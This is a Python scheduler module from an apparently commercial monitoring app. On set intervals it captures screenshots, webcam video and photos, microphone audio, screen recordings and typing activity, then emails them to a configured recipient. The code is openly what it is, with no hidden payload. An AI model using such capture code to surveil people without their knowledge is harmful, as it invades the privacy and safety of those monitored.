import schedule
import time
import threading
from datetime import datetime
from config import config_manager, DATA_DIR
from encryptor import encryptor
from capture.screenshot import capture_screenshot
from capture.telemetry import capture_telemetry
from capture.activity import capture_active_window
from capture.camera import capture_camera_video
from capture.camera_photo import capture_camera_photo
from capture.microphone import capture_microphone_audio
from capture.screen_record import capture_screen_record
from capture.typed_activity import capture_typed_activity
import os
import shutil
from logger_setup import log
from sender import send_support_log, send_bundled_report, send_instant_report
from auth import auth_service

CAPTURE_DIR = os.path.join(DATA_DIR, "captures")
OUTBOX_DIR = os.path.join(DATA_DIR, "outbox")
INSTANT_OUTBOX_DIR = os.path.join(DATA_DIR, "instant_outbox")

CAMERA_IN_USE = threading.Lock()
MIC_IN_USE = threading.Lock()
SCREEN_REC_IN_USE = threading.Lock()
TYPED_ACTIVITY_IN_USE = threading.Lock()

# This maps local config keys to database plan keys
FEATURE_MAP = {
    "screenshot": "SCREENSHOT",
    "telemetry": "TELEMETRY",
    "activity": "ACTIVITY_SUMMARY", # or ADVANCED_ACTIVITY
    "typed_activity": "TYPING_INTENSITY",
    "camera": "CAMERA",
    "camera_photo": "SCREENSHOT", # Mapped to SCREENSHOT to include in Base Plan
    "microphone": "MICROPHONE",
    "screen_record": "SCREEN_RECORD"
}

def is_time_to_run(feature_name_local):
    """
    Checks if the feature is:
    1. Allowed by the user's plan (from server)
    2. Enabled by the user (in settings)
    3. Within the correct time schedule
    """
    try:
        settings = config_manager.get_settings()
        
        # --- !! THIS IS THE FIX for the Security Hole !! ---
        # 1. Check if the feature is allowed by their subscription plan
        allowed_features = settings.get("allowed_features", [])
        
        feature_name_db = FEATURE_MAP.get(feature_name_local, "UNKNOWN")
        
        # Special case: 'activity' is in Base, 'advanced_activity' is in Standard
        if feature_name_local == "activity":
             if "ADVANCED_ACTIVITY" not in allowed_features and "ACTIVITY_SUMMARY" not in allowed_features:
                return False # Not allowed in any plan
        elif feature_name_db not in allowed_features:
            log.warning(f"Feature '{feature_name_local}' (DB: {feature_name_db}) is NOT in the user's plan {allowed_features}. Skipping.")
            return False
        # --- End of Fix ---

        # 2. Check if the user has this feature enabled in their settings
        feature_settings = settings["user_preferences"]
        if not feature_settings.get(f"{feature_name_local}_enabled", False):
            return False
            
        # 3. Check if it's the right time of day
        start_str = feature_settings.get(f"{feature_name_local}_start_time", "00:00")
        end_str = feature_settings.get(f"{feature_name_local}_end_time", "23:59")
        
        now_str = datetime.now().strftime("%H:%M")
        if end_str == "24:00": end_str = "23:59"

        if start_str <= end_str:
            return start_str <= now_str <= end_str
        else:
            return now_str >= start_str or now_str <= end_str
            
    except Exception as e:
        log.error(f"Error in is_time_to_run for {feature_name_local}: {e}")
        return False

def process_and_handle_file(raw_file_path, feature_name):
    """
    Processes a file (encrypts, zips) and then routes it
    to INSTANT, BUNDLE, or LOCAL FOLDER.
    """
    if not raw_file_path or not os.path.exists(raw_file_path):
        log.warning(f"Process/Handle called with no file path for {feature_name}")
        return
    
    def processing_thread():
        try:
            settings = config_manager.get_settings()
            feature_settings = settings["user_preferences"]
            password = settings["user"]["encryption_password"]
            security_mode = feature_settings[f"{feature_name}_security"]
            destination = feature_settings[f"{feature_name}_destination"]
        except Exception as e:
            log.error(f"Could not get settings for {feature_name}: {e}")
            return
        if (security_mode == "high" or security_mode == "zip") and not password:
            log.warning(f"No encryption password for {feature_name}. Deleting raw file.")
            try: os.remove(raw_file_path)
            except Exception: pass
            return
        final_path = None
        original_file_to_delete = None
        if security_mode == "high":
            final_path = encryptor.encrypt_file(raw_file_path, password)
            original_file_to_delete = raw_file_path
        elif security_mode == "zip":
            final_path = encryptor.create_zip_file(raw_file_path, password)
            original_file_to_delete = raw_file_path
        elif security_mode == "none":
            final_path = raw_file_path
        if not final_path:
            log.error(f"Failed to process file {raw_file_path}")
            return
        
        if destination == "instant":
            log.info(f"Queueing {feature_name} for INSTANT send.")
            if not auth_service.current_user:
                log.warning("User not logged in. Cannot send instant report.")
                return
            creds_result = auth_service.get_sender_assignment()
            if not creds_result.get("success"):
                log.error("Could not get sender credentials for instant report.")
                return
            sender_config = creds_result.get("data")
            recipient_email = settings["user"]["recipient_email"]
            threading.Thread(
                target=send_instant_report, 
                args=(sender_config, recipient_email, final_path), 
                daemon=True
            ).start()
        elif destination == "bundle":
            log.info(f"Moving {feature_name} to BUNDLE outbox.")
            try:
                if not os.path.exists(OUTBOX_DIR):
                    os.makedirs(OUTBOX_DIR)
                outbox_path = os.path.join(OUTBOX_DIR, os.path.basename(final_path))
                shutil.move(final_path, outbox_path)
            except Exception as e:
                log.error(f"Failed to move file {final_path} to outbox: {e}")
                if final_path != raw_file_path:
                    try: os.remove(final_path)
                    except Exception: pass
        elif destination == "local":
            local_save_path = settings["user"].get("local_save_path")
            if not settings["user"].get("local_save_enabled") or not local_save_path or not os.path.isdir(local_save_path):
                log.error(f"Cannot save locally. Feature not enabled or path invalid: {local_save_path}")
                if final_path != raw_file_path:
                    try: os.remove(final_path)
                    except Exception: pass
            else:
                log.info(f"Saving {feature_name} to LOCAL folder.")
                try:
                    # Security: Validate paths to prevent path traversal
                    # Ensure local_save_path is absolute and normalized
                    local_save_path_abs = os.path.abspath(os.path.normpath(local_save_path))
                    final_path_abs = os.path.abspath(os.path.normpath(final_path))
                    
                    # Validate that final_path is within allowed directories (captures, outbox, etc.)
                    allowed_dirs = [os.path.abspath("captures"), os.path.abspath("outbox"), os.path.abspath("instant_outbox")]
                    final_path_allowed = any(final_path_abs.startswith(allowed_dir) for allowed_dir in allowed_dirs)
                    
                    if not final_path_allowed:
                        log.error(f"Security: Attempted to move file from unauthorized location: {final_path_abs}")
                        raise ValueError("File path not in allowed directory")
                    
                    # Use basename to prevent path traversal in destination
                    safe_filename = os.path.basename(final_path)
                    # Additional validation: ensure filename doesn't contain path separators
                    if os.path.sep in safe_filename or os.path.altsep and os.path.altsep in safe_filename:
                        log.error(f"Security: Invalid filename contains path separators: {safe_filename}")
                        raise ValueError("Invalid filename")
                    
                    local_path = os.path.join(local_save_path_abs, safe_filename)
                    shutil.move(final_path_abs, local_path)
                    log.info(f"Successfully saved file to {local_path}")
                except Exception as e:
                    log.error(f"Failed to move file {final_path} to local save path: {e}")
                    if final_path != raw_file_path:
                        try: os.remove(final_path)
                        except Exception: pass
        
        if original_file_to_delete:
            try:
                os.remove(original_file_to_delete)
            except Exception as e:
                log.error(f"Error removing original file {original_file_to_delete}: {e}")
    threading.Thread(target=processing_thread, daemon=True).start()

def task_take_screenshot():
    if not is_time_to_run("screenshot"): return
    log.info("Scheduler: Capturing screenshot...")
    file_path = capture_screenshot()
    if file_path:
        process_and_handle_file(file_path, "screenshot")
def task_get_telemetry():
    if not is_time_to_run("telemetry"): return
    log.info("Scheduler: Capturing telemetry...")
    file_path = capture_telemetry()
    if file_path:
        process_and_handle_file(file_path, "telemetry")
def task_track_activity():
    if not is_time_to_run("activity"): return
    log.info("Scheduler: Capturing activity...")
    file_path = capture_active_window()
    if file_path:
        process_and_handle_file(file_path, "activity")
def task_capture_typed_activity():
    if not is_time_to_run("typed_activity"): return
    if not TYPED_ACTIVITY_IN_USE.acquire(blocking=False):
        log.warning("Typed-activity capture is already in progress. Skipping.")
        return
    try:
        log.info("Scheduler: Capturing typed-activity...")
        duration = config_manager.get_settings()["user_preferences"]["typed_activity_duration"]
        def capture_thread():
            file_path = capture_typed_activity(duration_sec=duration)
            if file_path:
                process_and_handle_file(file_path, "typed_activity")
            TYPED_ACTIVITY_IN_USE.release()
        threading.Thread(target=capture_thread, daemon=True).start()
    except Exception as e:
        log.error(f"Failed to start typed-activity task: {e}")
        if TYPED_ACTIVITY_IN_USE.locked():
            TYPED_ACTIVITY_IN_USE.release()
def task_capture_camera():
    if not is_time_to_run("camera"): return
    # PREFERENCE TO VIDEO: Wait up to 5 seconds for lock (in case a photo is being taken)
    if not CAMERA_IN_USE.acquire(timeout=5):
        log.warning("Camera is already recording. Skipping this interval.")
        return
    try:
        log.info("Scheduler: Capturing camera...")
        duration = config_manager.get_settings()["user_preferences"]["camera_duration"]
        file_path = capture_camera_video(duration_sec=duration)
        if file_path:
            process_and_handle_file(file_path, "camera")
    finally:
        CAMERA_IN_USE.release()

def task_capture_camera_photo():
    if not is_time_to_run("camera_photo"): return
    # PHOTO YIELDS: If camera is busy (e.g. video), skip immediately
    if not CAMERA_IN_USE.acquire(blocking=False):
        log.warning("Camera is in use (probably video). Skipping photo capture.")
        return
    try:
        log.info("Scheduler: Capturing camera photo...")
        file_path = capture_camera_photo()
        if file_path:
            process_and_handle_file(file_path, "camera_photo")
    finally:
        CAMERA_IN_USE.release()
def task_capture_microphone():
    if not is_time_to_run("microphone"): return
    if not MIC_IN_USE.acquire(blocking=False):
        log.warning("Microphone is already recording. Skipping this interval.")
        return
    try:
        log.info("Scheduler: Capturing microphone...")
        duration = config_manager.get_settings()["user_preferences"]["microphone_duration"]
        file_path = capture_microphone_audio(duration_sec=duration)
        if file_path:
            process_and_handle_file(file_path, "microphone")
    finally:
        MIC_IN_USE.release()
def task_capture_screen_record():
    if not is_time_to_run("screen_record"): return
    if not SCREEN_REC_IN_USE.acquire(blocking=False):
        log.warning("Screen recording is already in progress. Skipping this interval.")
        return
    try:
        log.info("Scheduler: Starting screen recording session...")
        duration_min = config_manager.get_settings()["user_preferences"]["screen_record_duration"]
        duration_sec = duration_min * 60
        threading.Thread(
            target=capture_screen_record, 
            args=(duration_sec, process_and_handle_file),
            daemon=True
        ).start()
        log.info(f"Screen record lock acquired. Will release in {duration_sec} seconds.")
        release_timer = threading.Timer(duration_sec + 5, release_screen_rec_lock)
        release_timer.daemon = True
        release_timer.start()
    except Exception as e:
        log.error(f"Failed to start screen record task: {e}")
        if SCREEN_REC_IN_USE.locked():
            SCREEN_REC_IN_USE.release()
def release_screen_rec_lock():
    if SCREEN_REC_IN_USE.locked():
        SCREEN_REC_IN_USE.release()
        log.info("Screen recording duration finished. Lock released.")
def task_bundle_and_send_report():
    log.info("Scheduler: Running BUNDLE AND SEND task...")
    if not os.path.exists(OUTBOX_DIR) or not os.listdir(OUTBOX_DIR):
        log.info("Outbox is empty. Nothing to bundle.")
        return
    if not auth_service.current_user: return
    creds_result = auth_service.get_sender_assignment()
    if not creds_result.get("success"): return
    settings = config_manager.get_settings()
    sender_config = creds_result.get("data")
    recipient_email = settings["user"]["recipient_email"]
    device_name = settings["user"]["device_name"]
    file_list = []
    for f in os.listdir(OUTBOX_DIR):
        file_path = os.path.join(OUTBOX_DIR, f)
        if os.path.isfile(file_path): file_list.append(file_path)
    if not file_list: return
    def send_in_thread():
        success = send_bundled_report(sender_config, recipient_email, file_list, device_name)
        if success:
            log.info("Bundled report sent. Clearing outbox.")
            for f in file_list:
                try: os.remove(f)
                except Exception as e: log.error(f"Failed to delete sent file {f}: {e}")
        else:
            log.error("Bundled report failed to send. Files will remain in outbox for next attempt.")
    threading.Thread(target=send_in_thread, daemon=True).start()
def task_send_log_file():
    log.info("Scheduler: Running task_send_log_file...")
    admin_email = config_manager.get_settings()["admin"]["admin_support_email"]
    # Fix: Use correct DATA_DIR path
    log_path = os.path.join(DATA_DIR, 'emoniter.log')
    if not os.path.exists(log_path): 
        log.warning(f"Scheduler: Log file not found at {log_path}")
        return
    if not admin_email or "your-support-email" in admin_email: return
    if not auth_service.current_user: return
    sender_creds_result = auth_service.get_sender_assignment()
    if not sender_creds_result.get("success"): return
    sender_config = sender_creds_result.get("data")
    def send_in_thread():
        log.info(f"Sending admin log file to {admin_email}...")
        success = send_support_log(sender_config, admin_email, log_path)
        if success: log.info("Admin log file sent successfully.")
        else: log.error("Admin log file send failed.")
    threading.Thread(target=send_in_thread, daemon=True).start()
def task_retry_instant_sends():
    log.info("Scheduler: Running RETRY INSTANT SENDS task...")
    if not os.path.exists(INSTANT_OUTBOX_DIR) or not os.listdir(INSTANT_OUTBOX_DIR):
        log.info("Instant outbox is empty. Nothing to retry.")
        return
    if not auth_service.current_user: return
    creds_result = auth_service.get_sender_assignment()
    if not creds_result.get("success"): return
    settings = config_manager.get_settings()
    sender_config = creds_result.get("data")
    recipient_email = settings["user"]["recipient_email"]
    for f in os.listdir(INSTANT_OUTBOX_DIR):
        file_path = os.path.join(INSTANT_OUTBOX_DIR, f)
        if os.path.isfile(file_path):
            log.info(f"Retrying instant send for: {f}")
            threading.Thread(
                target=send_instant_report, 
                args=(sender_config, recipient_email, file_path), 
                daemon=True
            ).start()
def task_process_emergency_queue():
    """Process queued emergency alerts"""
    try:
        from emergency_alert_manager import process_emergency_queue
        process_emergency_queue()
    except Exception as e:
        log.error(f"Error processing emergency queue: {e}")

def task_refresh_subscription_status():
    """
    Periodically refreshes subscription status and updates allowed features.
    This allows plan changes to take effect without requiring logout/login.
    """
    if not auth_service.current_user:
        return
    try:
        log.info("Scheduler: Refreshing subscription status...")
        old_features = config_manager.get_settings().get("allowed_features", [])
        sub_data = auth_service.get_subscription_status()
        
        if sub_data:
            new_features = []
            
            # If user is in trial, grant all premium features
            if sub_data.get('status') == 'trialing':
                # All premium features available during trial
                new_features = [
                    "SCREENSHOT",
                    "TELEMETRY",
                    "ACTIVITY_SUMMARY",
                    "ADVANCED_ACTIVITY",
                    "TYPING_INTENSITY",
                    "SCREEN_RECORD",
                    "CAMERA",
                    "MICROPHONE",
                    "REPORT_SCHEDULE"
                ]
                log.info(f"User is in trial - granting all premium features")
            elif sub_data.get('plans'):
                new_features = sub_data['plans'].get('features', [])
            
            settings = config_manager.get_settings()
            settings["allowed_features"] = new_features
            config_manager.update_settings(settings)
            
            # Check if features changed
            if set(old_features) != set(new_features):
                log.info(f"Plan features updated. Old: {old_features}, New: {new_features}")
                # Note: UI will refresh on next on_show() call
            else:
                log.debug("Subscription status checked. No changes detected.")
        else:
            log.warning("Could not refresh subscription status.")
    except Exception as e:
        log.error(f"Error refreshing subscription status: {e}")
class Scheduler(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.running = False
        self.event = threading.Event()
    def setup_jobs(self):
        schedule.clear()
        settings = config_manager.get_settings()
        prefs = settings["user_preferences"]
        
        # This function now correctly reads from the user_preferences
        if prefs["screenshot_enabled"]:
            schedule.every(prefs["screenshot_interval"]).minutes.do(task_take_screenshot)
        if prefs["telemetry_enabled"]:
            schedule.every(prefs["telemetry_interval"]).minutes.do(task_get_telemetry)
        if prefs["activity_enabled"]:
            schedule.every(prefs["activity_interval"]).minutes.do(task_track_activity)
        if prefs["typed_activity_enabled"]:
            schedule.every(prefs["typed_activity_interval"]).minutes.do(task_capture_typed_activity)
            log.info(f"Typed-Activity job scheduled every {prefs['typed_activity_interval']} min.")
        if prefs["camera_enabled"]:
            schedule.every(prefs["camera_interval"]).minutes.do(task_capture_camera)
            log.info(f"Camera job scheduled every {prefs['camera_interval']} min.")
        if prefs["microphone_enabled"]:
            schedule.every(prefs["microphone_interval"]).minutes.do(task_capture_microphone)
            log.info(f"Microphone job scheduled every {prefs['microphone_interval']} min.")
        if prefs.get("camera_photo_enabled"):
            schedule.every(prefs["camera_photo_interval"]).minutes.do(task_capture_camera_photo)
            log.info(f"Camera Photo job scheduled every {prefs['camera_photo_interval']} min.")
        if prefs["screen_record_enabled"]:
            schedule.every(prefs["screen_record_interval"]).minutes.do(task_capture_screen_record)
            log.info(f"Screen Record job scheduled every {prefs['screen_record_interval']} min.")

        report_cfg = settings["reporting"]
        if report_cfg["bundle_schedule_mode"] == "daily":
            daily_time = report_cfg["bundle_time_of_day"]
            schedule.every().day.at(daily_time).do(task_bundle_and_send_report)
            log.info(f"Report bundling scheduled daily at {daily_time}.")
        else: # interval
            interval = report_cfg["bundle_interval"]
            schedule.every(interval).minutes.do(task_bundle_and_send_report)
            log.info(f"Report bundling scheduled every {interval} minutes.")
        schedule.every(5).minutes.do(task_retry_instant_sends)
        log.info("Instant send retry job scheduled every 5 minutes.")
        log_interval = settings["admin"]["log_send_interval_hours"]
        schedule.every(log_interval).hours.do(task_send_log_file)
        log.info(f"Admin log send scheduled: every {log_interval} hours.")
        # Check subscription status every 10 minutes to update plan features
        schedule.every(10).minutes.do(task_refresh_subscription_status)
        log.info("Subscription status refresh scheduled every 10 minutes.")
        
        # Process emergency alert queue every 2 minutes
        schedule.every(2).minutes.do(task_process_emergency_queue)
        log.info("Emergency alert queue processing scheduled every 2 minutes.")
    def run(self):
        self.running = True
        log.info("Scheduler thread started.")
        self.setup_jobs()
        while self.running:
            schedule.run_pending()
            self.event.wait(timeout=1)
        log.info("Scheduler thread stopped.")
    def stop(self):
        log.info("Scheduler stopping... Triggering final data flush/send.")
        # Trigger immediate bundle and send of mostly collected data
        # task_bundle_and_send_report() spawns its own thread for sending, so this won't block UI
        try:
            task_bundle_and_send_report()
        except Exception as e:
            log.error(f"Failed to trigger final data flush: {e}")
            
        self.running = False
        self.event.set()